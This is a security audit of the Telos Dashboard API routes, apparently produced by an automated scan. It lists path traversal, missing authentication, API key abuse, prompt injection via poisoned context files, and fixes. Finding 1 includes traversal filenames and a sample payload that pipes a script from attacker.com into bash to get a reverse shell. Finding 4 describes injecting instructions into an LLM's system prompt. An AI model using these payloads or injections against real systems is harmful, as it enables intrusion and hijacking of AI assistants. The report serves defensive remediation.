# Security Audit: Telos Dashboard API Routes

**Date:** 2026-06-04
**Scope:** All Telos Dashboard API routes across Packs/Telos and 9 release versions (v2.3–v5.0.0)
**Auditor:** Automated vulnerability scan

---

## Executive Summary

The Telos Dashboard API routes contain **multiple critical and high-severity vulnerabilities** across all versions. The most severe are path traversal in file upload/save operations (allowing arbitrary file write to the filesystem) and the complete absence of authentication on all endpoints. The chat route in older versions (v2.3, v2.4) directly exposes the Anthropic API key in server-side code with no auth gate, meaning any network-adjacent attacker can abuse it.

**All 50 route files** across 10 locations (1 canonical + 9 releases) share the same vulnerability patterns. The routes are **identical across most versions** with only minor path/tool differences noted below.

---

## Vulnerability Inventory

| # | Severity | Vulnerability | Routes Affected | All Versions? |
|---|----------|--------------|-----------------|---------------|
| 1 | **CRITICAL** | Path Traversal → Arbitrary File Write | upload, file/save | Yes |
| 2 | **CRITICAL** | No Authentication on Any Endpoint | All 5 routes | Yes |
| 3 | **HIGH** | Path Traversal → Arbitrary File Read | file/get (indirect) | Yes |
| 4 | **HIGH** | Command Injection via Shell Spawn | chat (v2.5+) | v2.5+ |
| 5 | **HIGH** | API Key Exposure / Abuse | chat (v2.3, v2.4) | v2.3, v2.4 |
| 6 | **MEDIUM** | File Type Validation Bypass | upload | Yes |
| 7 | **MEDIUM** | Denial of Service via Unbounded Upload | upload | Yes |
| 8 | **LOW** | Information Disclosure in Error Messages | All routes | Yes |
| 9 | **LOW** | TELOS_DIR Mismatch (upload/save vs telos-data.ts) | upload, save | Yes |

---

## Detailed Findings

### FINDING 1: Path Traversal → Arbitrary File Write (CRITICAL)

**Affected Files (all identical pattern):**
- `Packs/Telos/src/DashboardTemplate/App/api/upload/route.ts` (lines 21, 49, 52)
- `Packs/Telos/src/DashboardTemplate/App/api/file/save/route.ts` (lines 10, 25, 27)
- Plus all 9 release versions at `Releases/{version}/.claude/skills/Telos/DashboardTemplate/App/api/upload/route.ts`
- Plus all 9 release versions at `Releases/{version}/.claude/skills/Telos/DashboardTemplate/App/api/file/save/route.ts`

**Vulnerable Code (upload/route.ts):**
```typescript
// Line 21: filename comes directly from user-uploaded file
const fileName = file.name

// Line 49: fileName is joined to path with NO sanitization
savePath = path.join(csvDir, fileName)

// Line 52: Same for markdown files
savePath = path.join(TELOS_DIR, fileName)

// Line 64: Unsanitized path written to disk
fs.writeFileSync(savePath, buffer)
```

**Vulnerable Code (file/save/route.ts):**
```typescript
// Line 10: filename comes directly from JSON body
const { filename, content } = await request.json()

// Lines 25, 27: filename joined to path with NO sanitization
filePath = path.join(csvDir, filename)
filePath = path.join(TELOS_DIR, filename)

// Line 39: Unsanitized path + attacker-controlled content written to disk
fs.writeFileSync(filePath, content, 'utf-8')
```

**Attack Chain:**

1. Attacker sends POST to `/api/upload` with a crafted multipart form where `file.name` = `../../../.ssh/authorized_keys`
2. `path.join(TELOS_DIR, '../../../.ssh/authorized_keys')` resolves to `~/.ssh/authorized_keys`
3. `fs.writeFileSync` writes the attacker's SSH public key to the target
4. Attacker now has SSH access to the server

**Alternative Attack (file/save):**

1. POST to `/api/file/save` with body: `{"filename": "../../../.bashrc", "content": "curl attacker.com/shell.sh | bash"}`
2. The `existsSync` check on line 31 succeeds (`.bashrc` exists)
3. `writeFileSync` overwrites `.bashrc` with attacker's payload
4. Next shell login executes the reverse shell

**Impact:** Complete filesystem write access as the running user. Can overwrite SSH keys, shell configs, cron jobs, application code, or any file the process user can write to.

**Root Cause:** No call to `path.basename()`, `path.resolve()` with containment check, or any form of path sanitization. The `path.join()` function resolves `..` segments, so `path.join('/home/user/.claude/skills/Telos', '../../../../etc/cron.d/backdoor')` resolves to a path outside the intended directory.

---

### FINDING 2: No Authentication on Any Endpoint (CRITICAL)

**Affected Files:**
- All 5 route files across all versions (50 files total)
- No `middleware.ts` file exists in the project
- `next.config.mjs` has no security headers or auth configuration

**Evidence:**
- Zero instances of `auth`, `session`, `cookie`, `token`, `middleware`, `authenticate`, or `authorization` in any DashboardTemplate TypeScript file
- No middleware.ts at the DashboardTemplate root or App directory
- All route handlers accept requests unconditionally

**Attack Chain:**

1. Dashboard runs on `localhost:3000` (Next.js default)
2. Any application on the same machine, browser tab, or network-adjacent host can call all endpoints
3. Combined with Finding 1: any process on the machine can write arbitrary files via the API
4. Combined with Finding 4: any process can execute inference commands

**Impact:** All API vulnerabilities are exploitable by any caller. No authentication barrier exists. This is especially dangerous because the dashboard reads/writes to the user's home directory (`~/.claude/`).

---

### FINDING 3: Path Traversal → Arbitrary File Read (HIGH)

**Affected Files:**
- `Packs/Telos/src/DashboardTemplate/App/api/file/get/route.ts` (line 9, 22)
- Plus all 9 release versions

**Vulnerable Code:**
```typescript
// Line 9: filename from query string, no sanitization
const filename = searchParams.get('filename')

// Line 22: Matched against files already loaded from disk
const file = files.find(f => f.filename === filename)
```

**Mitigation in Place (Partial):**
The `getAllTelosData()` function in `telos-data.ts` (lines 19-68) only reads files from a fixed directory using `readdirSync`, then matches by filename. This means an attacker cannot use `../` to escape — they can only read files already in the TELOS directory.

**However — Directory Inconsistency Creates Confusion:**
- `telos-data.ts` line 12: `TELOS_DIR = path.join(os.homedir(), '.claude/PAI/USER/TELOS')`
- `upload/route.ts` line 6: `TELOS_DIR = path.join(os.homedir(), '.claude/skills/Telos')`
- `file/save/route.ts` line 6: `TELOS_DIR = path.join(os.homedir(), '.claude/skills/Telos')`

The upload and save routes write to a **different directory** than the get route reads from. This means:
- Files uploaded via the upload endpoint won't appear in the get endpoint
- An attacker could write malicious files to `.claude/skills/Telos/` that are never validated by the read path

**Impact:** Limited file read (confined to TELOS directory), but the directory inconsistency means uploaded/saved files bypass the read-path's implicit validation.

---

### FINDING 4: Command Injection via Shell Spawn (HIGH)

**Affected Files:**
- `Packs/Telos/src/DashboardTemplate/App/api/chat/route.ts` (lines 31-34)
- All release versions v2.5+ (v2.5, v3.0, v4.0.0, v4.0.1, v4.0.2, v4.0.3, v5.0.0)

**Vulnerable Code:**
```typescript
// Line 7: message comes directly from user JSON input
const { message } = await request.json()

// Lines 19-28: message is embedded into systemPrompt (not the direct injection vector)
// The telosContext is also injected into systemPrompt — attacker-controlled if they
// wrote malicious TELOS files via Finding 1

// Line 33: message passed as CLI argument to spawned process
const proc = spawn('bun', [
  'run',
  `${homeDir}/.claude/PAI/Tools/Inference.ts`,
  '--level', 'fast',
  systemPrompt,   // Contains telosContext (potentially attacker-controlled)
  message          // Direct user input as CLI argument
], {
  stdio: ['ignore', 'pipe', 'pipe'],
})
```

**Attack Chain (Indirect via TELOS poisoning):**

1. Attacker uses Finding 1 to write a malicious `.md` file to the TELOS directory
2. The malicious file contains prompt injection content
3. When `getTelosContext()` reads this file, it's included in the `systemPrompt`
4. The systemPrompt is passed as a CLI argument to `spawn('bun', [..., systemPrompt, ...])`
5. While `spawn` with array args avoids shell metacharacter injection, the attacker controls the LLM's system prompt, enabling prompt injection against the inference model

**Note on spawn safety:** The use of `spawn()` with an array of arguments (not a shell string) means traditional command injection (`; rm -rf /`) is **not possible** — Node.js passes arguments directly to the exec syscall without shell interpretation. This is a correct defensive pattern.

**However, the real risk is prompt injection:** The user's `message` and the TELOS-derived `systemPrompt` are both passed to an LLM inference call. An attacker who can control the TELOS context (via Finding 1) can inject arbitrary instructions into the LLM system prompt.

**Impact:** Prompt injection against the inference model. Not direct command injection (spawn is safe), but the attacker can manipulate the AI's behavior by poisoning its context files.

---

### FINDING 5: API Key Exposure / Abuse (HIGH)

**Affected Files:**
- `Releases/v2.3/.claude/skills/Telos/DashboardTemplate/App/api/chat/route.ts` (lines 15, 30)
- `Releases/v2.4/.claude/skills/Telos/DashboardTemplate/App/api/chat/route.ts` (same pattern)

**Vulnerable Code (v2.3/v2.4 only):**
```typescript
// Line 15: API key read from environment
const apiKey = process.env.ANTHROPIC_API_KEY

// Line 30: Key sent in request header to Anthropic API
"x-api-key": apiKey,
```

**Attack Chain:**

1. No authentication exists on the `/api/chat` endpoint (Finding 2)
2. Any caller can send messages to the chat endpoint
3. The server uses the owner's Anthropic API key to fulfill requests
4. Attacker gets free LLM inference at the owner's expense
5. Combined with a timing/response-size side channel, the attacker can potentially extract the TELOS context (which contains personal life data)

**Impact:** Unauthorized use of the owner's Anthropic API key. Financial impact (API billing). Potential extraction of personal data from TELOS context via the LLM responses.

**Note:** Versions v2.5+ migrated to `spawn('bun', ['run', 'Inference.ts', ...])` which uses Claude CLI subscription auth instead of a raw API key, eliminating the direct API key exposure. However, the no-auth problem (Finding 2) still allows unauthorized inference abuse.

---

### FINDING 6: File Type Validation Bypass (MEDIUM)

**Affected Files:**
- `Packs/Telos/src/DashboardTemplate/App/api/upload/route.ts` (lines 22-24)
- All release versions

**Vulnerable Code:**
```typescript
// Lines 22-24: Extension-only validation
const fileName = file.name
const isMarkdown = fileName.endsWith('.md')
const isCSV = fileName.endsWith('.csv')
```

**Bypass Methods:**

1. **Double extension:** `malicious.sh.md` — passes validation, written as `.md` but contains shell script
2. **Path traversal + extension:** `../../.bashrc.md` — passes `.md` check, traverses directories
3. **No MIME type check:** The `Content-Type` of the uploaded file is never validated
4. **No content inspection:** File contents are never checked for consistency with the extension
5. **No file size limit:** Entire `arrayBuffer()` is loaded into memory with no size cap

**Impact:** Attacker can upload any content as long as the filename ends with `.md` or `.csv`. Combined with Finding 1, this allows writing arbitrary content to arbitrary paths.

---

### FINDING 7: Denial of Service via Unbounded Upload (MEDIUM)

**Affected Files:**
- `Packs/Telos/src/DashboardTemplate/App/api/upload/route.ts` (line 33)
- All release versions

**Vulnerable Code:**
```typescript
// Line 33: Entire file loaded into memory with no size limit
const arrayBuffer = await file.arrayBuffer()
const buffer = Buffer.from(arrayBuffer)
```

**Attack Chain:**

1. POST a multi-gigabyte file to `/api/upload` with name `huge.md`
2. `file.arrayBuffer()` attempts to load entire file into Node.js heap
3. Process runs out of memory and crashes (OOM kill)
4. No rate limiting exists

**Impact:** Application crash, denial of service. Repeated uploads can keep the service down.

---

### FINDING 8: Information Disclosure in Error Messages (LOW)

**Affected Files:**
- All route files contain `console.error` that may log sensitive information
- `upload/route.ts` line 58: reveals full filesystem path in response: `File ${fileName} already exists`
- `upload/route.ts` line 77: reveals save path: `path: savePath`
- `file/save/route.ts` line 33: reveals whether files exist at specific paths

**Impact:** Path disclosure aids path traversal attacks. Error messages confirm/deny file existence.

---

### FINDING 9: TELOS_DIR Mismatch (LOW)

**Affected Files:**
- `Packs/Telos/src/DashboardTemplate/App/api/upload/route.ts` line 6: `'.claude/skills/Telos'`
- `Packs/Telos/src/DashboardTemplate/App/api/file/save/route.ts` line 6: `'.claude/skills/Telos'`
- `Packs/Telos/src/DashboardTemplate/Lib/telos-data.ts` line 12: `'.claude/PAI/USER/TELOS'`

**Impact:** Upload/save routes write to a different directory than the read routes read from. This is likely a bug that also creates a security gap: files written by the upload endpoint are never visible through the get endpoint, so any integrity checks on the read path don't apply to written files.

**Version-specific variant:** In v2.3, the upload/save routes use `'.claude/skills/life/telos'` (a third different path).

---

## Version Comparison Matrix

| Route | v2.3 | v2.4 | v2.5–v4.0.2 | v4.0.3 | v5.0.0 | Packs (canonical) |
|-------|------|------|-------------|--------|--------|-------------------|
| upload | Different TELOS_DIR | Same as canonical | Same as canonical | Same as canonical | Same as canonical | Baseline |
| file/save | Different TELOS_DIR | Same as canonical | Same as canonical | Same as canonical | Same as canonical | Baseline |
| file/get | Identical | Identical | Identical | Identical | Identical | Baseline |
| chat | **Direct API key** | **Direct API key** | spawn Inference.ts | Same as canonical | Tools→TOOLS path diff | Baseline (spawn) |
| files/count | Identical | Identical | Identical | Identical | Identical | Baseline |

**Key differences:**
- **v2.3/v2.4 chat route:** Uses direct `fetch()` to Anthropic API with raw API key in headers instead of spawning Inference.ts
- **v2.3 upload/save routes:** Different base directory (`'.claude/skills/life/telos'`)
- **v5.0.0 chat route:** Inference.ts path uses `TOOLS` (uppercase) instead of `Tools`

---

## Remediation Recommendations

### Priority 1 (CRITICAL — fix immediately)

1. **Add path sanitization to all file operations:**
```typescript
function sanitizeFilename(filename: string): string {
  const basename = path.basename(filename);
  if (basename !== filename || filename.includes('..') || filename.includes('/')) {
    throw new Error('Invalid filename');
  }
  return basename;
}
```

2. **Add path containment verification:**
```typescript
function ensureWithinDirectory(filePath: string, baseDir: string): void {
  const resolved = path.resolve(filePath);
  const resolvedBase = path.resolve(baseDir);
  if (!resolved.startsWith(resolvedBase + path.sep)) {
    throw new Error('Path traversal detected');
  }
}
```

3. **Add authentication middleware:**
```typescript
// middleware.ts at DashboardTemplate root
export function middleware(request: NextRequest) {
  // At minimum, restrict to localhost
  const host = request.headers.get('host');
  if (!host?.startsWith('localhost') && !host?.startsWith('127.0.0.1')) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 });
  }
}
```

### Priority 2 (HIGH)

4. **Add file size limits** to upload route (e.g., 10MB max)
5. **Add MIME type validation** in addition to extension checks
6. **Fix TELOS_DIR inconsistency** between upload/save and telos-data.ts
7. **Remove API key from v2.3/v2.4** chat routes (migrate to Inference.ts pattern)

### Priority 3 (MEDIUM)

8. **Add rate limiting** to all endpoints
9. **Sanitize error messages** to not reveal filesystem paths
10. **Add Content Security Policy** headers via next.config.mjs

---

## Files Analyzed

**Canonical (Packs):**
- `Packs/Telos/src/DashboardTemplate/App/api/upload/route.ts`
- `Packs/Telos/src/DashboardTemplate/App/api/file/save/route.ts`
- `Packs/Telos/src/DashboardTemplate/App/api/file/get/route.ts`
- `Packs/Telos/src/DashboardTemplate/App/api/chat/route.ts`
- `Packs/Telos/src/DashboardTemplate/App/api/files/count/route.ts`
- `Packs/Telos/src/DashboardTemplate/Lib/telos-data.ts`

**Release versions (9 copies x 5 routes = 45 files):**
- `Releases/{v2.3,v2.4,v2.5,v3.0,v4.0.0,v4.0.1,v4.0.2,v4.0.3,v5.0.0}/.claude/skills/Telos/DashboardTemplate/App/api/{upload,file/save,file/get,chat,files/count}/route.ts`

**Supporting files:**
- `Releases/v5.0.0/.claude/PAI/TOOLS/Inference.ts` (516 lines)
- `Releases/v4.0.3/.claude/PAI/Tools/Inference.ts` (255 lines)
- `Packs/Telos/src/DashboardTemplate/.env.example`
- `Packs/Telos/src/DashboardTemplate/next.config.mjs`
